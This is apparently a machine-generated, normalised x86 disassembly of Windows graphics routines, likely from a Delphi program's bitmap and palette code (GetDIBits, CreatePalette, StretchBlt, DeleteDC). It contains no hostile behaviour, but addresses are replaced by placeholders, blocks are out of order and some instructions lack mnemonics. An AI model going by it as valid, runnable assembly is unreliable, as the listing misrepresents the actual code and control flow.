cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41c1d4
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41ce58
call sub_41c1d4
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
jbe r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
jmp r-xdata
push esi
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_41da20
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x20 ]
push eax
call DeleteDC
retn
push 0xffffffff
push ebx
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
call sub_403aa4
call sub_403aa4
jmp r-xdata
sub_421255
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_421264
mov eax [ ebp - 0x10 ]
push eax
call DeleteObject
call sub_403a20
call sub_403a74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_4212c4
push ebx
push esi
add esp 0xfffffbf8
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
add esp 0x408
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
mov [ esp + 0x4 ] 0x300
mov ax [ esp ]
mov [ esp + 0x6 ] ax
lea eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
lea eax [ esp + 0x4 ]
push eax
call CreatePalette
mov esi eax
sub_421328
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x70 ]
push eax
push 0x54
push ebx
call GetObjectA
test eax eax
je r-xdata
mov eax ebx
call sub_42081c
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_421523
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call GetDC
call sub_41da20
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_41da20
mov [ ebp - 0x10 ] eax
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
call CreateBitmap
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
cmp edi 0x1fffffff
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_41da20
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4214db
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x5c ] 0x0
je r-xdata
push 0x42
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call PatBlt
jmp r-xdata
retn
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
mov [ ebp - 0x11 ] 0x0
mov [ ebp - 0x11 ] 0x1
xor eax eax
mov [ ebp - 0x58 ] eax
lea eax [ ebp - 0x70 ]
push eax
push 0x0
mov ecx esi
mov edx esi
mov eax ebx
call sub_420c60
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push edi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
mov esi eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call BitBlt
push esi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
push 0x0
push esi
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push ebx
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
test esi esi
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push ebx
call DeleteObject
sub_421534
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_41eba0
mov [ edi + 0x34 ] 0x20000000
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_420a8c
cmp [ rw-data ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax edi
test bl bl
je r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_42159c
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
mov eax esi
call sub_421cac
mov eax [ esi + 0x28 ]
call sub_420a90
mov eax [ esi + 0x2c ]
call sub_40326c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_413f58
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_4215d8
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_421690
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402c88
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_421f1c
mov esi ebx
mov eax [ esi + 0x28 ]
call sub_420a8c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_420a90
mov eax [ esi + 0x28 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov al [ esi + 0x21 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x21 ] al
mov eax [ esi + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov al [ esi + 0x38 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] al
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_413f84
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
sub_4216c8
push ebp
mov ebp esp
add esp 0xffffffa4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x5c ]
push ecx
mov ecx 0x15
[ edi ] [ esi ]
pop ecx
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_421cac
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_421757
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ rw-data ]
jne r-xdata
mov eax esi
call sub_4212c4
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x8 ] esi
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax edi
call sub_420c60
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_421f1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_42175c
mov eax [ ebp - 0x8 ]
call sub_41b904
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_403a20
call sub_403a74
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
sub_421788
push ebx
mov ebx eax
mov eax ebx
call sub_421a7c
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x50 ] edx
xor edx edx
mov [ eax + 0x54 ] edx
add eax 0x6c
call sub_40cd80
pop ebx
retn
sub_4217b8
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov esi eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov eax esi
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
call sub_4156a4
mov eax [ ebx + 0x28 ]
push esi
lea esi [ eax + 0x18 ]
lea edi [ esp + 0x4 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ esp + 0x14 ] eax
mov eax ebx
call sub_421cac
lea eax [ ebx + 0x2c ]
call sub_40cd80
push esp
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_421f1c
add esp 0x54
pop edi
pop esi
pop ebx
retn
sub_42182c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebx + 0x28 ]
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_41d6fc
mov eax ebx
call sub_421dbc
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
push 0xc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
push eax
push 0xe
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
mov edx eax
pop eax
imul edx
cmp eax 0x8
jg r-xdata
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call RealizePalette
mov [ ebp - 0x9 ] 0x1
xor eax eax
jmp r-xdata
movzx edx [ esi + 0x2a ]
movzx ecx [ esi + 0x28 ]
imul edx ecx
cmp eax edx
jl r-xdata
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_421bb8
test al al
jne r-xdata
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetBrushOrgEx
push 0x4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetStretchBltMode
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0xd ]
push eax
mov eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetBrushOrgEx
jmp r-xdata
xor eax eax
push ebp
push sub_421a68
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
push 0x3
mov eax [ ebp - 0x4 ]
call sub_41d628
push eax
call SetStretchBltMode
mov eax ebx
call sub_421afc
mov dl [ r-xdata ]
call sub_41d6fc
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
mov eax ebx
call sub_421d5c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ esi + 0x1c ]
push eax
push 0x0
push 0x0
mov eax ebx
call sub_421afc
mov eax [ eax + 0x4 ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call StretchBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421a6f
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_4219fd
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call CreateCompatibleDC
call sub_41da20
mov [ ebp - 0x18 ] eax
mov eax [ esi + 0xc ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax ebx
call sub_421afc
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ esi + 0x1c ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x0
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_41dbc4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
retn
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
sub_421a7c
push ebx
push esi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x4 ] 0x1
jle r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax esi
call sub_421cbc
cmp [ ebx + 0x71 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
xor eax eax
jmp r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
lea edx [ ebx + 0x18 ]
push edx
mov ecx eax
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_4216c8
pop esi
pop ebx
retn
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x2c ] eax
push esi
call DeleteObject
test eax eax
jne r-xdata
call sub_41d978
sub_421afc
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov eax [ ebx + 0x2c ]
pop esi
pop ebx
retn
mov eax ebx
call sub_421cbc
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_420898
mov esi eax
mov [ ebx + 0x2c ] esi
mov [ esi + 0x2c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x28 ] eax
mov [ esi + 0x34 ] ebx
mov [ esi + 0x30 ] sub_421788
sub_421b44
push ebx
mov ebx eax
mov eax ebx
call sub_421cac
mov eax ebx
call sub_421cbc
mov edx ebx
mov eax ebx
call sub_421788
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
pop ebx
retn
sub_421b68
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x8 ]
test edx edx
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp edx [ eax + 0x14 ]
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov al 0x1
jmp r-xdata
retn
sub_421be8
push ebx
mov ebx eax
mov eax [ ebx + 0x34 ]
cmp eax 0x20000000
jne r-xdata
call sub_41c1d4
mov eax ebx
call sub_421bb8
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
dec eax
push eax
mov eax ebx
call sub_421afc
xor edx edx
pop ecx
call sub_41d5b4
jmp r-xdata
mov eax 0xffffff
jmp r-xdata
or eax 0x2000000
pop ebx
retn
sub_421c38
push ebx
push esi
mov ebx [ eax + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
call sub_421dbc
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
lea eax [ ebx + 0x18 ]
push eax
push 0x0
mov esi [ ebx + 0x10 ]
mov ecx esi
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_420c60
mov [ ebx + 0x14 ] eax
lea eax [ ebx + 0x18 ]
push eax
push 0x54
mov eax [ ebx + 0x8 ]
push eax
call GetObjectA
lea eax [ ebx + 0x18 ]
mov edx eax
add eax 0x18
mov [ eax ] 0x28
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] 0x1
mov cx [ edx + 0x10 ]
imul cx [ edx + 0x12 ]
mov [ eax + 0xe ] cx
sub_421cbc
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
mov edx [ eax + 0x14 ]
mov [ eax + 0x8 ] edx
cmp [ eax + 0x6c ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ eax + 0x6c ]
call sub_415640
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x14 ]
mov [ ebp - 0xc ] edx
xor eax eax
push ebp
push sub_421d3f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x10 ] edx
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
retn
sub_421d5c
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x32 ] 0x0
je r-xdata
mov esi [ ebx + 0x28 ]
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
cmp [ ebx + 0x31 ] 0x0
jne r-xdata
mov eax ebx
call sub_421cac
mov eax ebx
call sub_421cbc
mov esi [ ebx + 0x28 ]
mov eax ebx
call sub_421be8
mov ecx eax
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
call sub_421328
mov [ esi + 0xc ] eax
mov [ ebx + 0x32 ] 0x1
mov [ ebx + 0x31 ] 0x1
call sub_42081c
mov eax [ esi + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_421dbc
push ebx
push esi
push edi
push ebp
mov edi eax
mov ebp [ edi + 0x28 ]
cmp [ edi + 0x30 ] 0x0
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ ebp + 0x14 ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov cx [ ebp + 0x3e ]
mov eax 0x1
shl eax cl
mov ecx eax
xor edx edx
mov eax [ ebp + 0x14 ]
call sub_41e110
mov esi eax
mov [ ebp + 0x10 ] esi
test esi esi
jne r-xdata
call sub_42081c
push 0x0
call GetDC
call sub_41da20
mov esi eax
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
mov bl 0x1
push 0xc
push esi
call GetDeviceCaps
mov ebx eax
push 0xe
push esi
call GetDeviceCaps
imul ebx eax
movzx eax [ ebp + 0x2a ]
movzx edx [ ebp + 0x28 ]
imul edx
cmp ebx eax
jl r-xdata
push esi
push 0x0
call ReleaseDC
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
call CreateHalftonePalette
mov [ ebp + 0x10 ] eax
xor ebx ebx
jmp r-xdata
mov [ edi + 0x30 ] 0x1
mov [ ebp + 0x71 ] bl
test bl bl
je r-xdata
sub_421e74
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
mov ebx ecx
mov esi eax
cmp dx 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_41d8e8
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x54 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx ebx
mov eax esi
call sub_4216c8
mov eax [ esi + 0x28 ]
mov [ eax + 0x70 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ esi + 0x22 ] al
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_421cac
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x54
call sub_402c88
lea eax [ ebp - 0x54 ]
push eax
push 0x54
push ebx
call GetObjectA
cmp [ ebp - 0x40 ] 0x0
jne r-xdata
sub_421ef8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push eax
mov eax ebx
call sub_415620
pop ecx
sub ecx eax
mov edx ebx
mov eax esi
call sub_4225ac
pop esi
pop ebx
retn
sub_421f1c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_421fa3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax + 0x10 ] esi
mov eax [ ebp + 0x10 ]
mov edx [ ebp - 0x8 ]
mov esi eax
lea edi [ edx + 0x18 ]
mov ecx 0x15
[ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
mov dl [ ebp + 0xc ]
mov [ eax + 0x70 ] dl
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ r-xdata ]
call sub_40341c
mov edx [ ebp - 0x8 ]
mov [ edx + 0x6c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x14 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_422003
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_420a90
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x28 ] eax
call sub_420a8c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42200a
push rw-data
call LeaveCriticalSection
retn
sub_42201c
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ esp ]
mov edx esi
mov eax ebx
call sub_4225ac
pop edx
pop edi
pop esi
pop ebx
retn
sub_422044
push ebp
mov ebp esp
add esp 0xffffff54
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x20 ] 0xc
sete [ ebp - 0x21 ]
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax 0xc
add eax 0x400
call sub_4026bc
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x3c ] eax
xor edx edx
push ebp
push sub_422561
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
push ebp
push sub_422534
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov [ ebp - 0x20 ] 0x28
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub esi [ ebp - 0x20 ]
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
cmp eax 0x3
je r-xdata
lea edx [ ebp - 0x48 ]
add edx 0x4
mov ecx 0x8
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx [ ebp - 0x3c ]
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402c88
mov eax ebx
movzx edx [ ebp - 0x44 ]
mov [ eax + 0x4 ] edx
movzx edx [ ebp - 0x42 ]
mov [ eax + 0x8 ] edx
mov dx [ ebp - 0x40 ]
mov [ eax + 0xc ] dx
mov dx [ ebp - 0x3e ]
mov [ eax + 0xe ] dx
sub esi 0xc
jmp r-xdata
mov ebx [ ebp - 0x3c ]
mov eax [ ebp - 0x20 ]
mov [ ebx ] eax
mov eax [ ebp - 0x18 ]
add eax [ ebp - 0x20 ]
mov [ ebp - 0x1c ] eax
cmp [ ebx + 0xc ] 0x1
je r-xdata
test eax eax
je r-xdata
cmp [ ebp - 0x20 ] 0x28
jne r-xdata
call sub_41d900
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ ebp - 0x38 ] eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
cmp ax 0x10
je r-xdata
mov edx [ ebp + 0x8 ]
mov ecx 0xe
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax esi
xor edx edx
push edx
push eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_4158bc
mov edx esi
neg edx
mov cx 0x2
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
